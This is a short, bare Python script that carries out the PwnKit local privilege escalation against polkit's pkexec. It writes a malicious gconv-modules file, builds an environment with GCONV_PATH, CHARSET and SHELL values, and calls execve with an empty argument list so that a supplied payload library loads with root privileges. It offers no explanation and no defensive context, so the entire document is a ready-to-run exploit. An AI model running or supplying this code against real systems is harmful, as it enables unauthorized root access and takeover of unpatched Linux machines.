import subprocess
import sys
import os
import shutil
from ctypes import cdll, c_char_p, POINTER
libc = cdll.LoadLibrary("libc.so.6")
libc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)
polkit_bin = sys.argv[1].encode('latin-1')
payload_file = sys.argv[2]
random_string_1 = sys.argv[3]
random_string_2 = sys.argv[4]
file = open(random_string_1 + "/gconv-modules", 'w')
file.write("module UTF-8// " + random_string_2 + "// " + random_string_1 + " 2")
file.close()
argv = [None]
cmd = polkit_bin
env = [random_string_1.encode('latin-1')]
env.append(b"PATH=GCONV_PATH=.")
env.append(b"CHARSET=" + random_string_2.encode('latin-1'))
env.append(b"SHELL="+random_string_1.encode('latin-1'))
env.append(None)
cargv = (c_char_p * len(argv))(*argv)
cenvp = (c_char_p * len(env))(*env)
libc.execve(cmd, cargv, cenvp)